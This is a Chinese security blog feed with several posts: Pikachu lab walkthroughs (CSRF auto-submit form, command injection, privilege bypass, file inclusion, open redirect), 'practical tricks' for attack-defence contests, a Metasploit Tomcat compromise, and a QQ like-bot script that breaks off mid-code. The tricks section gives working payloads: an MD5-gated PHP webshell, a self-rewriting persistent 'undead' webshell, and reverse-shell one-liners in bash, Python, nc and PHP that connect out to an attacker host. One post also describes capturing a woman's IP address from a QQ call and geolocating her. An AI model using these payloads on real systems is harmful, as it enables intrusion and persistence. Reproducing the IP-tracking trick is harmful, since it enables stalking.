Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://ipadd/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1557833844; wp-settings-1=mfold%3Do; PHPSESSID=gaumm4piiptr5mtnjtsrp3hes6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">sex=girl&amp;phonenum=138&amp;add=tianjin&amp;email=2222222%40tju.com&amp;submit=submit</span><br><span class="line">``` </span><br><span class="line">这种需要提交payload表单的环节, 需要我们自己的站点作为跳板, 类似前面的xss_post.</span><br><span class="line"></span><br><span class="line">写一个自动提交表单的页面出来.</span><br><span class="line">```html</span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;http://ipadd/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;input id=&quot;mycsrf1&quot; type= &quot;text&quot; maxlength=&quot;20&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;mycsrf2&quot; type= &quot;text&quot; maxlength=&quot;20&quot; name=&quot;phonenum&quot; value=&quot;138&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;mycsrf3&quot; type= &quot;text&quot; maxlength=&quot;20&quot; name=&quot;email&quot; value=&quot;22222@qq.com&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;script&gt; </span><br><span class="line">                document.getElementById(&quot;postsubmit&quot;).click();</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><del>好麻烦啊</del></p>
<p>测试一下, 成功了.</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>这两个都很简单, 一带而过咯. </p>
<h3 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h3><p>远程执行ping命令.</p>
<p>可以使用<code>|</code>(管道)来执行多条命令. </p>
<p>比如 <code>ping localhost | ls</code>, 会发现把当前目录的文件列表打印了出来.</p>
<h3 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h3><p>如果学过了<code>php一句话木马</code>, 对<code>eval()</code>这个函数都不会陌生.</p>
<p><code>system(&#39;ls&#39;);</code></p>
<h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><h3 id="op1-member"><a href="#op1-member" class="headerlink" title="op1 member"></a>op1 member</h3><p>随便登录一个账号后, 点击查看个人信息.</p>
<p>发现被查询的用户是写进URL里的.</p>
<p>修改URL的参数为想要查询的账号即可越权查询.</p>
<h3 id="op2-login"><a href="#op2-login" class="headerlink" title="op2 login"></a>op2 login</h3><p>有两个管理员账号. 分别是普通管理(pikachu)和超级管理(admin)</p>
<p>先使用<code>burp suite</code>抓取admin的cookie.</p>
<p>在登录pikachu后, 尝试超级操作(如添加账号). 并讲数据包中的cookie换成admin的cookie. </p>
<p>发现操作成功了.</p>
<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><p>在URL中filename参数为要包含的文件.</p>
<p>可以实现任意文件读取. </p>
<h2 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h2><p>可以看到URL后面接了一个url参数.</p>
<p>修改这个参数即可跳转到我们指定的页面.例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/urlredirect/urlredirect.php?url=https://tjuyjn.top</span><br></pre></td></tr></table></figure>

]]></content>
      
        
        <tags>
            
            <tag> 文件包含漏洞 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> xss </tag>
            
            <tag> PHP反序列化漏洞 </tag>
            
            <tag> csrf </tag>
            
            <tag> RCE </tag>
            
            <tag> 越权 </tag>
            
            <tag> URL重定向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[实战中可能会用到的几个技巧]]></title>
      <url>/2019/07/29/%E5%AE%9E%E6%88%98%E4%B8%AD%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<h1 id="实战中可能会用到的几个技巧"><a href="#实战中可能会用到的几个技巧" class="headerlink" title="实战中可能会用到的几个技巧"></a>实战中可能会用到的几个技巧</h1><a id="more"></a>
<p>还有半个多月蓝帽杯就要开始了, 真的瑟瑟发抖. 估计要被虐菜.<br>唉, 实在不行就当北京一日游了QAQ.</p>
<h2 id="md5-加密一句话木马"><a href="#md5-加密一句话木马" class="headerlink" title="md5 加密一句话木马"></a>md5 加密一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密码: a='youjianing' &amp; b</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'a'</span>]) == <span class="string">'a4e8129c8cf66411c82c9a02fa08d223'</span>)&#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'b'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过一层md5加密, 使得木马的安全性大大提高.<br>值得注意的是实战中需要找到足够安全的MD5密文.<br>顺便在这几次试验中确认, index是否被<code>&#39; &#39; 或 &quot; &quot;</code>包裹无影响. (没有系统学过PHP伤不起, 一到这种细节的地方就容易犯嘀咕) </p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h3><p>本来是想好好整理出自己的文章的, 但是<a href="https://www.jianshu.com/p/6aca9b29514d" target="_blank" rel="noopener">这篇博客</a>我觉得已经把基本的方法罗列的很清楚, 写的足够好了. </p>
<h3 id="linux命令反弹shell"><a href="#linux命令反弹shell" class="headerlink" title="linux命令反弹shell"></a>linux命令反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span><br></pre></td></tr></table></figure>

<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.1.146 7777</span><br></pre></td></tr></table></figure>

<h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><h4 id="php的exec函数反弹"><a href="#php的exec函数反弹" class="headerlink" title="php的exec函数反弹"></a>php的<code>exec函数</code>反弹</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.146/7777");'</span><br></pre></td></tr></table></figure>

<h4 id="php的fsockopen远程连接"><a href="#php的fsockopen远程连接" class="headerlink" title="php的fsockopen远程连接"></a>php的<code>fsockopen</code>远程连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure>

<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><h3 id="制作不死马"><a href="#制作不死马" class="headerlink" title="制作不死马"></a>制作不死马</h3><p>在awd中, 经过混淆的一句话木马虽然能提供可使用的shell, 但是容易被服务器管理者发现并删除, 这不利于权限的维持.<br>不死马(也叫内存马), 一旦在目标主机中运行就无法通过一般的方法删除, 这对我们持续持有权限是极有帮助的.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 摘自 https://www.jianshu.com/p/3cd8cc491b54</span></span><br><span class="line"><span class="comment"># ?pass=pass&amp;</span></span><br><span class="line"><span class="comment"># 密码 ?pass=pass &amp; a</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>ignore_user_abort($setting)</code>:<br>  函数设置与客户机断开是否会终止脚本的执行.<br>  setting: 可选。如果设置为 true，则忽略与用户的断开，如果设置为 false，(与用户的断开)会导致脚本停止运行。如果未设置该参数，会返回当前的设置。</li>
<li><code>set_time_limit($time)</code>:<br>  设置脚本的最大运行时间, 如果$time=0, 则不限制时间.</li>
<li><code>unlink($file)</code>:<br>  删除文件. <code>$file=__FILE__</code>, 则删除脚本自身.</li>
<li><code>file_put_contents($file,$code)</code>:<br>  将字符串<code>$code</code>写入文件<code>$file</code>中.</li>
<li><code>usleep($time)</code>:<br>  暂停<code>$time</code>(毫秒), 与<code>sleep($time)</code>唯一的区别为单位, sleep()为秒.</li>
</ul>
<p>此处code写入的是上文提到的加密过的一句话木马, 可以根据需要自行修改.</p>
<p>目前脚本在Windows下, 使用<code>VScode</code>的<code>run code</code>可以成功运行并实现”不死”, 也可以通过web服务, 使用浏览器访问使之运行.<br>不过在linux下, 包括Ubuntu和kali系统, 我都无法通过浏览器访问的方式让脚本运行, 只能用命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ./不死马.php</span><br></pre></td></tr></table></figure>

<p>来运行 <del>, 这一点还不知道为什么.</del><br><del>希望dalao们能指点迷津.</del></p>
<p>嗯, 在<a href="https://www.tjuscswyz.cn/" target="_blank" rel="noopener">p4ssw0rd</a>学长的鼎力支持下, 我基本搞明白怎么回事了.<br><strong>再次感谢学长</strong></p>
<h3 id="上述异常的原因和解决办法"><a href="#上述异常的原因和解决办法" class="headerlink" title="上述异常的原因和解决办法"></a>上述异常的原因和解决办法</h3><p>我们在<code>linux</code>(包括<code>ubuntu</code>和<code>kali</code>)下没办法用浏览器连接启动的原因, 其实是权限问题.<br>当我把不死马(<code>buisma.php</code>)放在web目录下然后访问, 浏览器会表示正在加载, 可是回过头来看.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>如果正常运行的话, 不死马文件本身是要被删除的. 可是<code>busima.php</code>既没有被删除, 也没有创建<code>2.php</code>这个文件.<br>其实问题就出在这里. 我们知道<code>linux</code>的每个文件和目录都有权限控制. 如果用<code>ls -al</code>查看某个目录或者文件, 最前面会显示出权限控制信息, 通常为类似下面这段代码.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxrwxr-x 2 ubuntu ubuntu     4096  Jul  30  20:09 test</span><br></pre></td></tr></table></figure>

<p>这是什么意思呢?</p>
<blockquote>
<p>首先d表示这个文件是一个文件夹，然后文件的权限一共有9个字符表示，分成三组，分别表示文件所属用户的权限，文件所属用户组的权限，其他人的权限，r 表示读权限, w表示写权限， x表示执行权限.<br>From : <a href="https://zhidao.baidu.com/question/294587410.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/294587410.html</a></p>
</blockquote>
<p>按照我们的例子就是: </p>
<ul>
<li><code>test</code>是一个目录</li>
<li>所属用户拥有读写执行, 所属用户组拥有读写执行权限, 其它用户拥有读执行权限, 没有写入权限.</li>
<li>所属用户为ubuntu, 所属用户组为ubuntu</li>
</ul>
<p>如果我们使用web服务来使其运行, 那么就是以www-data用户执行, 它属于其它用户, 没有写入权限.<br>而之前提到的删除正需要写入权限, 自然程序到这里就没法继续执行了.<br>事实是否如此, 我们可以验证下. </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:/var/www/html$ chmod test 777</span><br><span class="line">ubuntu@VM-0-3-ubuntu:/var/www/html$ ls -al "test"</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwx  2 ubuntu   ubuntu   4096 Jul 31 14:33 .</span><br><span class="line">(略)</span><br></pre></td></tr></table></figure>

<p>浏览器访问, 不死马直接运行, 没得毛病!</p>
<h3 id="杀死不死马"><a href="#杀死不死马" class="headerlink" title="杀死不死马"></a>杀死不死马</h3><p>因为不死马已经被写进内存中不断写<code>webshell</code>, 所以只删除<code>webshell</code>没有任何意义. 必须终止不死马的进程.<br>如果是拥有管理员权限的情况下, 直接关掉<code>apache2</code>服务是最直接的, 因为不死马是在它的子进程下.<br>不过比赛中一般都是低权限用户, 没法直接关闭<code>apache2</code>服务. 但也可以用下面的方法杀不死马.<br>用蚁剑或菜刀连上自己留的<code>webshell</code>(相当于登录<code>www-data</code>用户), 然后在终端输入命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall -u www-data</span><br></pre></td></tr></table></figure>

<p>kill 所有<code>www-data</code>用户下的进程(当然也包括<code>busima</code>). 很巧的是, 那些root的服务, 我们权限不够, kill 不了, 自然不会让服务挂掉.</p>
<h2 id="metasploit一次实战"><a href="#metasploit一次实战" class="headerlink" title="metasploit一次实战"></a>metasploit一次实战</h2><ol start="0">
<li><p>为什么要记录这次?<br>因为这次是我第一次比较正式的使用<code>metasploit</code>, 也真正的见识到了它的强大, 我相信这个工具将来还会扮演更重要的角色.<br>除此之外, 这个靶机位于国外, 需要科学上网, 所以如果将来想要复现还比较麻烦, 不如干脆详细的记录一下. 供将来的自己参照查看.</p>
</li>
<li><p>首先查看自己的ip和子网ip, 这是所有步骤的开始.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/ipconfig.png" alt title class>
                <p></p>
            </figure></li>
<li><p>获取了子网的ip地址后, 我们知道靶机就在这个子网中, 所以可以用Nmap扫出靶机的位置.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/nmapsubnet.png" alt title class>
                <p></p>
            </figure>
<p>靶机IP为<code>192.68.149.3</code></p>
</li>
<li><p>这个时候如果直接用浏览器访问是访问不到的. 因为我们还不知道它的http端口是多少(默认大多为80或8080). 我们还需要更详细的信息.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/nmapA.png" alt title class>
                <p></p>
            </figure></li>
<li><p>再次访问<code>192.68.149.3:8080</code>就能访问web服务了. 下面就用这次的主角<code>metasploit</code>针对<code>tomcat</code>的漏洞进行攻击.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/search.png" alt title class>
                <p></p>
            </figure></li>
<li><p>我们选用tomcat_mgr_login这个漏洞来尝试获得后台的账户和密码.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/use1.png" alt title class>
                <p></p>
            </figure></li>
<li><p>查看相关的参数</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/options1.png" alt title class>
                <p></p>
            </figure></li>
<li><p>设置参数. 包括靶机的ip和端口, 使用的账户名和密码字典.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/set1.png" alt title class>
                <p></p>
            </figure></li>
<li><p>设置完成后就可以开始漏洞利用了.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/exploit11.png" alt title class>
                <p></p>
            </figure></li>
<li><p>成功爆破出了我们要的东西.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/exploit12.png" alt title class>
                <p></p>
            </figure></li>
<li><p>用浏览器尝试下能不能登陆后台.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/webbrowser1.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/webbrowser2.png" alt title class>
                <p></p>
            </figure>
<p>没有问题!</p>
</li>
<li><p>下面再用第二个漏洞来获取shell.<br>这次我们用tomcat_mgr_upload, 并查看参数.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/useandset.png" alt title class>
                <p></p>
            </figure></li>
<li><p>设置好后就开始漏洞利用.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/exploit2.png" alt title class>
                <p></p>
            </figure></li>
<li><p>下面是成功后的效果.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/meterpreter.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/operatarget.png" alt title class>
                <p></p>
            </figure>
<p>可以看到这里的<code>meterpreter</code>和真正的shell还是有所区别的.<br>值得注意的一点, 可以用下面的命令来使用python调出shell.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/sh')"</span><br></pre></td></tr></table></figure>
</li>
<li><p>完.<br><del>头一次截了这么多图, 真鸡儿累.</del><br><del>抱歉, 图被无良七牛云吞了, 有生之年可能会找回来.</del><br><del>还好当时是用QQ截的图, 缓存在QQ里了, 哈哈哈</del></p>
<h2 id="用QQ获取女神的IP"><a href="#用QQ获取女神的IP" class="headerlink" title="用QQ获取女神的IP"></a>用QQ获取女神的IP</h2><p>某个寂寞的夜晚, 我又想起我的女神.<br>女神啊, 你现在在何方?<br>马上就能知道.<br>.<br>.<br>.<br>这边打开着<code>wireshark</code>, 开始抓包.<br>拿起手机, 打开女神的qq聊天框, 丢过去个qq电话.<br>大概过个几秒(时间把握好, 别让女神接了电话…哈哈哈).<br>回到<code>wireshark</code>这, 停止抓包.</p>
</li>
</ol>
<p>Ctrl+F, 设置为<strong>字符串</strong>和<strong>分组详情</strong>.<br>然后在框里输入<code>020048</code>, 就能找到女神的IP地址了<br>这串代码应该是QQ电话的请求的二进制码的一部分.</p>
<p>效果:</p>
<p><del>图没了 QAQ</del></p>
<p>于是我拿着女神的IP尝试着定位了一下, 感觉没什么异常, <font color="green">就安心了</font>.</p>
<p>完.<br>好吧, 这和实战没啥关系, 就是觉得好玩. 而且也很简单.</p>
<p><a href="https://blog.csdn.net/qq78069460/article/details/79153958" target="_blank" rel="noopener">详细过程</a></p>
<h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>接触网络安全越久, 发现自己的未知面就越广.<br>觉得自己要学的东西还有太多.<br><strong>不过我不想急于求成, 惟愿每天都有所收获.</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> metasploit </tag>
            
            <tag> awd </tag>
            
            <tag> 不死马 </tag>
            
            <tag> 反弹shell </tag>
            
            <tag> linux权限控制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[用python给女神刷赞会发生什么？]]></title>
      <url>/2019/07/19/%E5%BD%93%E4%BD%A0%E7%94%A8python%E7%BB%99%E5%A5%B3%E7%A5%9E%E5%88%B7%E8%B5%9E%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88/</url>
      <content type="html"><![CDATA[<h1 id="用python给女神刷赞会发生什么？"><a href="#用python给女神刷赞会发生什么？" class="headerlink" title="用python给女神刷赞会发生什么？"></a>用python给女神刷赞会发生什么？</h1><a id="more"></a>
<p><strong>会被博主发到博客里啦, 笨蛋.</strong></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># code=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line"><span class="comment"># 如果是无界面的浏览 </span></span><br><span class="line"><span class="comment"># chrome_options.add_argument('--headless')</span></span><br><span class="line">chrome = webdriver.Chrome(chrome_options=chrome_options)  <span class="comment">#浏览器驱动</span></span><br><span class="line"></span><br><span class="line">you_qq_number = <span class="number">1348651580</span>   <span class="comment"># 你的QQ号</span></span><br><span class="line">you_qq_password = <span class="string">"JXU2MjREJXU0RTBEJXU0RjFBJXU1NDRBJXU4QkM5JXU0RjYwJXU1QkM2JXU3ODAxJXU1NDYy"</span> <span class="comment">#你的密码</span></span><br><span class="line">friends_qq_number =  <span class="number">123</span>     <span class="comment"># 你想给点赞的好友的qq号</span></span><br><span class="line">number_of_like = <span class="number">0</span>           <span class="comment"># 记录点了多少赞</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将find_element_by_xpath()方法封装, 作用是可以反复查找那些因为加载延迟而无法定位的元素, 避免因为这些情况导致程序崩溃</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span><span class="params">(xpath)</span>:</span>           </span><br><span class="line">    times = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:    </span><br><span class="line">            <span class="keyword">return</span> chrome.find_element_by_xpath(xpath)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"第"</span>+str(times)+<span class="string">"次定位"</span>+xpath+<span class="string">"失败"</span>)</span><br><span class="line">            times = times + <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将视角锁定到这个元素上, 不然可能无法点击</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_to_element</span><span class="params">(element)</span>:</span></span><br><span class="line">    chrome.execute_script(<span class="string">"arguments[0].scrollIntoView();"</span>,element)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟点赞</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_like</span><span class="params">(number)</span>:</span></span><br><span class="line">    xpath = <span class="string">"//*[@id='host_home_feeds']/li["</span>+str(number)+<span class="string">"]"</span></span><br><span class="line">    view_to_element(locate(xpath)) </span><br><span class="line">    <span class="keyword">if</span> number==<span class="number">1</span> <span class="keyword">and</span> locate(xpath+<span class="string">"/div[1]"</span>).get_attribute(<span class="string">"class"</span>) == <span class="string">'f-single-top'</span>:</span><br><span class="line">        <span class="comment"># 存在置顶说说时</span></span><br><span class="line">        xpath += <span class="string">"/div[4]/div[1]/p/a[3]"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        xpath += <span class="string">"/div[3]/div[1]/p/a[3]"</span></span><br><span class="line">    <span class="keyword">if</span> locate(xpath).get_attribute(<span class="string">'data-clicklog'</span>) == <span class="string">"like"</span>:            </span><br><span class="line">        locate(xpath+<span class="string">"/i"</span>).click()</span><br><span class="line">        <span class="keyword">global</span> number_of_like</span><br><span class="line">        number_of_like += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"the number of clicking like is : "</span>+str(number_of_like))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 开启页面</span></span><br><span class="line">    chrome.get(<span class="string">"https://user.qzone.qq.com/"</span>+str(you_qq_number) +<span class="string">"/main"</span>)</span><br><span class="line">    chrome.maximize_window()</span><br><span class="line">    chrome.implicitly_wait(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 帐号密码登陆</span></span><br><span class="line">    chrome.switch_to.frame(<span class="string">"login_frame"</span>)</span><br><span class="line">    chrome.find_element_by_link_text(<span class="string">"帐号密码登录"</span>).click()</span><br><span class="line"></span><br><span class="line">    chrome.find_element_by_id(<span class="string">"u"</span>).send_keys(you_qq_number)</span><br><span class="line">    chrome.find_element_by_id(<span class="string">"p"</span>).send_keys(you_qq_password)</span><br><span class="line">    chrome.find_element_by_id(<span class="string">"login_button"</span>).click()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    locate(<span class="string">"//*[@id='id_photowall_closetips']/s"</span>).click()</span><br><span class="line">    locate(<span class="string">"//a[//*[@id='qz_notification']/a[2]]"</span>).click()    </span><br><span class="line"></span><br><span class="line">    chrome.get(<span class="string">"https://user.qzone.qq.com/"</span>+str(friends_qq_number) +<span class="string">"/main"</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> you_qq_number != friends_qq_number:</span><br><span class="line">        <span class="comment"># 关掉烦人的弹窗</span></span><br><span class="line">        chrome.find_element_by_xpath(<span class="string">"//*[@id='friendship_promote_layer']/table/tbody/tr[1]/td[2]/a"</span>).click()</span><br><span class="line">    chrome.switch_to.frame(locate(<span class="string">"//*[@id='QM_Feeds_Iframe']"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历说说, 并且下拉加载更多</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_to_like</span><span class="params">(number)</span>:</span></span><br><span class="line">    <span class="comment"># 尝试定位置顶说说</span></span><br><span class="line">    <span class="keyword">for</span> x 